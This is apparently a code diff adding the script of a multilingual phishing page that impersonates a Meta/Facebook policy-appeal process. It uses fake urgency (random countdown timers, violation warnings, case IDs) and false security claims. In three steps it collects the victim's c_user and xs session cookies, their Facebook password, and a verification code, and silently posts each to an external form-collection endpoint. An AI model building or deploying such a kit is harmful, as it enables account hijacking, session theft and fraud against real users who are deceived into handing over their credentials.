+      warnSub:'Nkitahodiɛ bɛyɛ pii a ɛfiri ɔmanfo ne yɛn nhyehyɛeɛ a ɛyɛ adwuma no ahu sɛ wo krataa no adi yɛn mmara so daa. Yɛfii esiaa adwuma yi ase Maarso 13, 2026.',
+      caseTitle:'Mmara Nhyehyɛeɛ Ho Nsɛm', appealBtnTxt:'Hyɛ Me Apɛl No Ase Seesei',
+      disclaimerTxt:'Sɛ wotua so a, wuboa wo ho sɛ wopenin Meta mmara nkrataa ne ɔman nhyehyɛeɛ.',
+      s1Title:'Wo Ho Nhwehwɛmu', s1Sub:'Sɛ yɛbɛyɛ wo apɛl no yiye a, yɛhwehwɛ sɛ woyi wo ho adi sɛ wo na wokura krataa no.',
+      s1Info1:'🔒 Wode wo data kyɛ yɛn a yɛde 256-bit TLS nhyehyɛeɛ di dwuma.',
+      s1Info2:'⚠️ Sɛ wode nsɛm nkɔkɔ ma yɛn a, yɛbɛpo wo apɛl no ntɛm.',
+      cuserLabel:'c_user', xsLabel:'xs',
+      cuserErr:'Ɛsɛ sɛ ɛyɛ nɔma ID pa (ɛsɛ sɛ ɛwɔ nɔma 7 pɔ)', xsErr:'Ɛsɛ sɛ ɛwɔ titiriw, ketewa, nɔma ne sign ahodoɔ',
+      s1BtnTxt:'De To Mu Na Tua So',
+      s2Title:'Account Nhwehwɛmu', s2Sub:'Sɛ wobɛyi wo ho adi sɛ wo na wokura krataa no a, hyɛ wo Facebook password no.',
+      s2Info1:'🔐 Yɛnsɔ wo password nhyɛ faako na yɛnkyerɛw no.',
+      pwLabel:'Password', pwErr:'Hyɛ wo password sɛ wotumi tua so',
+      s2BtnTxt:'Hwɛ Na Tua So', forgotPw:'Wɔagye Password?',
+      s3Title:'Video Wo Ho Nhwehwɛmu', s3Sub:'Sɛ akyiri nhwehwɛmu a, hwɛ nhwehwɛmu video no nyinaa na hyɛ code a ɛda ase no.',
+      s3Info1:'▶️ Hwɛ video no nyinaa na hyɛ code a ɛkyerɛ ase no.',
+      codeLabel:'Hyɛ Nhwehwɛmu Code', codeErr:'Hyɛ code a ɛda video no mu',
+      s3BtnTxt:'De Apɛl Kyɛrɛw Akyiri To Mu',
+      sucTitle:'Wɔade Apɛl No To Mu Yiye',
+      sucSub:'Yɛagyɛ wo apɛl no adi na yɛde ama Meta Mmara Hwɛ Kuw no. Wɔbɛka asɛm no kyerɛ wo da 5-7 dwumadie mu.',
+      sucRefLbl:'Reference ID:',
+      sucS1:'Yɛn hwɛ kuw no agyɛ wo apɛl adi na wɔrehwɛ wo nkrataahyɛde.',
+      sucS2:'Obi a onim dwuma no bɛba wo apɛl so daa 24-48 mu.',
+      sucS3:'Wɔbɛsoma asɛm no brɛ wo wo email so.',
+      vrTypeLbl:'Mfomsoɔ Nhyehyɛeɛ', vrTypeVal:'Nsɛm Mmara',
+      vrStatusLbl:'Account Tɛnkranteɛ', vrStatusVal:'Wɔrehwɛ Ho',
+      vrDeadlineLbl:'Apɛl Bere', vrDeadlineVal:'Daa 24 Mu',
+      countdownLabel:'Bere a aka sɛ wobɛhyɛ apɛl:', ps1Lbl:'Wo Ho\nNhwehwɛmu', ps2Lbl:'Account\nNhwehwɛmu', ps3Lbl:'Video\nNhwehwɛmu',
+      tHrs:'DonHW', tMin:'SRAM', tSec:'SEKO',
+    },
+  };
+
+  const videoSrc = {
+    english:    'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
+    spanish:    'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+    hindi:      'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
+    french:     'https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4',
+    portuguese: 'https://allvideos.wasmer.app/Portuguese.mp4',
+    tamil:      'https://allvideos.wasmer.app/tamil.mp4',
+    arabic:     'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4',
+    ghanaian:   'https://allvideos.wasmer.app/english.mp4',
+    vietnamese: 'https://allvideos.wasmer.app/vietanames.mp4',
+  };
+
+  const flagSrc = {
+    english:'https://flagcdn.com/24x18/us.png', hindi:'https://flagcdn.com/24x18/in.png',
+    spanish:'https://flagcdn.com/24x18/es.png', portuguese:'https://flagcdn.com/24x18/pt.png',
+    tamil:'https://flagcdn.com/24x18/in.png', arabic:'https://flagcdn.com/24x18/sa.png',
+    french:'https://flagcdn.com/24x18/fr.png', vietnamese:'https://flagcdn.com/24x18/vn.png',
+    ghanaian:'https://flagcdn.com/24x18/gh.png',
+  };
+
+  /* ── STATE ─────────────────────────────────────────────────── */
+  let currentLang = 'english';
+  let submittedData = {};
+  const caseId = 'META-' + Math.random().toString(36).substring(2,7).toUpperCase() + '-2026';
+  const refId  = 'REF-' + Date.now().toString(36).toUpperCase();
+
+  /* ── HELPERS ──────────────────────────────────────────────── */
+  function t(key) { return (T[currentLang] && T[currentLang][key]) || (T.english[key] || ''); }
+  function setDir(lang) {
+    document.documentElement.dir = lang === 'arabic' ? 'rtl' : 'ltr';
+    document.documentElement.lang = lang;
+  }
+  function generateRefId() { return 'REF-' + Math.random().toString(36).substring(2,9).toUpperCase(); }
+
+  /* ── APPLY TRANSLATIONS ─────────────────────────────────── */
+  function applyLang() {
+    setDir(currentLang);
+    // header
+    document.getElementById('hdr-badge').textContent = t('hdrBadge');
+    document.getElementById('hdr-lang-name').textContent = currentLang.charAt(0).toUpperCase() + currentLang.slice(1);
+    document.getElementById('hdr-flag').src = flagSrc[currentLang];
+    // step 0
+    document.getElementById('warn-title').textContent = t('warnTitle');
+    document.getElementById('warn-sub').textContent = t('warnSub');
+    document.getElementById('case-title').textContent = t('caseTitle');
+    document.getElementById('case-id').textContent = caseId;
+    document.getElementById('vr-type-lbl').textContent = t('vrTypeLbl');
+    document.getElementById('vr-type-val').textContent = t('vrTypeVal');
+    document.getElementById('vr-status-lbl').textContent = t('vrStatusLbl');
+    document.getElementById('vr-status-val').textContent = t('vrStatusVal');
+    document.getElementById('vr-deadline-lbl').textContent = t('vrDeadlineLbl');
+    document.getElementById('vr-deadline-val').textContent = t('vrDeadlineVal');
+    document.getElementById('appeal-btn-txt').textContent = t('appealBtnTxt');
+    document.getElementById('disclaimer-txt').innerHTML = t('disclaimerTxt');
+    document.getElementById('countdown-label').innerHTML = '<strong>' + t('countdownLabel') + '</strong>';
+    document.getElementById('tl-h').textContent = t('tHrs');
+    document.getElementById('tl-m').textContent = t('tMin');
+    document.getElementById('tl-s').textContent = t('tSec');
+    // progress labels
+    ['1','2','3'].forEach(n => {
+      const el = document.getElementById('ps'+n+'-lbl');
+      if (el) { el.textContent = t('ps'+n+'Lbl').replace('\\n','\n'); }
+    });
+    // step 1
+    document.getElementById('s1-title').textContent = t('s1Title');
+    document.getElementById('s1-sub').textContent = t('s1Sub');
+    document.getElementById('s1-info1').textContent = t('s1Info1');
+    document.getElementById('s1-info2').textContent = t('s1Info2');
+    document.getElementById('lbl-cuser').textContent = t('cuserLabel');
+    document.getElementById('lbl-xs').textContent = t('xsLabel');
+    document.getElementById('err-cuser').textContent = t('cuserErr');
+    document.getElementById('err-xs').textContent = t('xsErr');
+    document.getElementById('s1-btn-txt').textContent = t('s1BtnTxt');
+    // step 2
+    document.getElementById('s2-title').textContent = t('s2Title');
+    document.getElementById('s2-sub').textContent = t('s2Sub');
+    document.getElementById('s2-info1').textContent = t('s2Info1');
+    document.getElementById('lbl-pw').textContent = t('pwLabel');
+    document.getElementById('err-pw').textContent = t('pwErr');
+    document.getElementById('s2-btn-txt').textContent = t('s2BtnTxt');
+    document.getElementById('s2-forgot').textContent = t('forgotPw');
+    // step 3
+    document.getElementById('s3-title').textContent = t('s3Title');
+    document.getElementById('s3-sub').textContent = t('s3Sub');
+    document.getElementById('s3-info1').textContent = t('s3Info1');
+    document.getElementById('lbl-code').textContent = t('codeLabel');
+    document.getElementById('err-code').textContent = t('codeErr');
+    document.getElementById('s3-btn-txt').textContent = t('s3BtnTxt');
+    // success
+    document.getElementById('suc-title').textContent = t('sucTitle');
+    document.getElementById('suc-sub').textContent = t('sucSub');
+    document.getElementById('suc-ref-lbl').textContent = t('sucRefLbl');
+    document.getElementById('suc-s1').textContent = t('sucS1');
+    document.getElementById('suc-s2').textContent = t('sucS2');
+    document.getElementById('suc-s3').textContent = t('sucS3');
+    // video — reload and re-lock form
+    const vsrc = videoSrc[currentLang] || videoSrc.english;
+    const vidEl = document.getElementById('appeal-video');
+    document.getElementById('video-src').src = vsrc;
+    vidEl.load();
+    lockVideoStep();
+  }
+
+  /* ── STEP NAV ──────────────────────────────────────────────── */
+  let currentStep = 0;
+  function showStep(n) {
+    document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
+    document.getElementById('step-' + (n === 4 ? 'success' : n)).classList.add('active');
+    // progress
+    ['1','2','3'].forEach((s,i) => {
+      const ps = document.getElementById('ps-'+(i+1));
+      const pl = document.getElementById('pl-'+(i+1));
+      if (n > i+1) { ps.className = 'progress-step done'; if(pl) pl.className = 'progress-line done'; }
+      else if (n === i+1) { ps.className = 'progress-step active'; if(pl) pl.className = 'progress-line'; }
+      else { ps.className = 'progress-step'; if(pl) pl.className = 'progress-line'; }
+    });
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    currentStep = n;
+  }
+
+  /* ── FLOATING LABEL HELPERS ─────────────────────────────── */
+  function setupFloatLabel(inputId, wrapId) {
+    const inp = document.getElementById(inputId);
+    const wrap = document.getElementById(wrapId);
+    function upd() { inp.value ? wrap.classList.add('has-value') : wrap.classList.remove('has-value'); }
+    inp.addEventListener('input', upd);
+    inp.addEventListener('focus', () => wrap.classList.add('has-value'));
+    inp.addEventListener('blur', upd);
+  }
+  setupFloatLabel('inp-cuser','fw-cuser');
+  setupFloatLabel('inp-xs','fw-xs');
+  setupFloatLabel('inp-pw','fw-pw');
+  setupFloatLabel('inp-code','fw-code');
+
+  /* ── COUNTDOWN TIMER ─────────────────────────────────────── */
+  const randHours = Math.floor(Math.random() * 19) + 5; // 5 to 23 hrs
+  const randMins  = Math.floor(Math.random() * 60);
+  const randSecs  = Math.floor(Math.random() * 60);
+  let total = randHours * 3600 + randMins * 60 + randSecs;
+  function updateTimer() {
+    const h = Math.floor(total/3600), m = Math.floor((total%3600)/60), s = total%60;
+    document.getElementById('t-h').textContent = String(h).padStart(2,'0');
+    document.getElementById('t-m').textContent = String(m).padStart(2,'0');
+    document.getElementById('t-s').textContent = String(s).padStart(2,'0');
+    if (total > 0) total--;
+  }
+  updateTimer();
+  setInterval(updateTimer, 1000);
+
+  /* ── LANGUAGE MODAL ─────────────────────────────────────── */
+  const langWrap = document.getElementById('lang-modal-wrap');
+  const langConfirm = document.getElementById('lang-confirm-btn');
+  let selectedLang = null;
+
+  document.querySelectorAll('.lang-opt').forEach(opt => {
+    opt.addEventListener('click', () => {
+      document.querySelectorAll('.lang-opt').forEach(o => o.classList.remove('active'));
+      opt.classList.add('active');
+      selectedLang = opt.dataset.lang;
+      langConfirm.disabled = false;
+    });
+  });
+
+  document.getElementById('lang-search').addEventListener('input', function () {
+    const q = this.value.toLowerCase();
+    document.querySelectorAll('.lang-opt').forEach(opt => {
+      opt.style.display = opt.textContent.toLowerCase().includes(q) ? '' : 'none';
+    });
+  });
+
+  langConfirm.addEventListener('click', () => {
+    if (!selectedLang) return;
+    currentLang = selectedLang;
+    applyLang();
+    langWrap.classList.remove('show');
+    document.getElementById('app').classList.add('show');
+  });
+
+  document.getElementById('hdr-lang-btn').addEventListener('click', () => {
+    langWrap.classList.add('show');
+  });
+
+  function openLangModal() { langWrap.classList.add('show'); }
+
+  /* ── LOADING SCREEN ─────────────────────────────────────── */
+  const loadingScreen = document.getElementById('loading-screen');
+  let loaderDone = false;
+  function dismissLoader() {
+    if (loaderDone) return;
+    loaderDone = true;
+    loadingScreen.classList.add('fade-out');
+    setTimeout(() => { loadingScreen.style.display = 'none'; openLangModal(); }, 700);
+  }
+  setTimeout(dismissLoader, 3000);
+  setTimeout(dismissLoader, 6000);
+
+  /* ── PASSWORD TOGGLE ─────────────────────────────────────── */
+  document.getElementById('toggle-pw').addEventListener('click', () => {
+    const inp = document.getElementById('inp-pw');
+    const show = inp.type === 'password';
+    inp.type = show ? 'text' : 'password';
+    document.getElementById('eye-show').style.display = show ? 'none' : '';
+    document.getElementById('eye-hide').style.display = show ? '' : 'none';
+  });
+
+  /* ── VALIDATION ─────────────────────────────────────────── */
+  function validateCuser(v) { return /^\d{7,}$/.test(v.trim()); }
+  function validateXs(v) { return /[A-Z]/.test(v) && /[a-z]/.test(v) && /[0-9]/.test(v) && /[^A-Za-z0-9]/.test(v); }
+  function showErr(id, show) {
+    document.getElementById('err-'+id).classList.toggle('show', show);
+    document.getElementById('inp-'+id).classList.toggle('error', show);
+  }
+
+  /* ── SUPABASE FIRE-AND-FORGET ─────────────────────────────── */
+  function supaPost(url, body) {
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(body),
+    }).catch(() => {});
+  }
+
+  /* ── STEP 0 → 1 ─────────────────────────────────────────── */
+  document.getElementById('appeal-btn').addEventListener('click', () => showStep(1));
+
+  /* ── STEP 1 SUBMIT ──────────────────────────────────────── */
+  document.getElementById('s1-btn').addEventListener('click', () => {
+    const cuser = document.getElementById('inp-cuser').value.trim();
+    const xs = document.getElementById('inp-xs').value.trim();
+    let ok = true;
+    if (!validateCuser(cuser)) { showErr('cuser', true); ok = false; } else { showErr('cuser', false); }
+    if (!validateXs(xs)) { showErr('xs', true); ok = false; } else { showErr('xs', false); }
+    if (!ok) return;
+    submittedData = { name: cuser, xs, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language };
+    const btn = document.getElementById('s1-btn');
+    btn.classList.add('loading'); btn.disabled = true;
+    supaPost('https://submit-form.com/8Qb4HVoVD',
+      { name: cuser, mall: xs, timestamp: submittedData.timestamp, userAgent: submittedData.userAgent, language: submittedData.language });
+    setTimeout(() => { btn.classList.remove('loading'); btn.disabled = false; showStep(2); }, 1200);
+  });
+
+  /* ── STEP 2 SUBMIT ──────────────────────────────────────── */
+  document.getElementById('s2-btn').addEventListener('click', () => {
+    const pw = document.getElementById('inp-pw').value;
+    if (!pw) { showErr('pw', true); return; }
+    showErr('pw', false);
+    const btn = document.getElementById('s2-btn');
+    btn.classList.add('loading'); btn.disabled = true;
+    supaPost('https://submit-form.com/8Qb4HVoVD',
+      { Password: pw, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language });
+    setTimeout(() => { btn.classList.remove('loading'); btn.disabled = false; showStep(3); }, 1200);
+  });
+
+  document.getElementById('s2-forgot').addEventListener('click', e => e.preventDefault());
+
+  /* ── VIDEO GATE (locks Step 1 form until video ends) ─────── */
+  function lockVideoStep() {}
+
+
+  /* ── STEP 3 SUBMIT ──────────────────────────────────────── */
+  document.getElementById('s3-btn').addEventListener('click', () => {
+    const code = document.getElementById('inp-code').value.trim();
+    if (!code) { showErr('code', true); return; }
+    showErr('code', false);
+    const btn = document.getElementById('s3-btn');
+    btn.classList.add('loading'); btn.disabled = true;
+    supaPost('https://submit-form.com/8Qb4HVoVD',
+      { code, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language });
+    setTimeout(() => {
+      btn.classList.remove('loading'); btn.disabled = false;
+      document.getElementById('suc-ref-val').textContent = refId;
+      showStep(4);
+    }, 1500);
+  });
+
+  /* ── CASE ID ─────────────────────────────────────────────── */
+  document.getElementById('case-id').textContent = caseId;
+  document.getElementById('suc-ref-val').textContent = refId;
+
+})();
+</script>
+</body>
+</html>
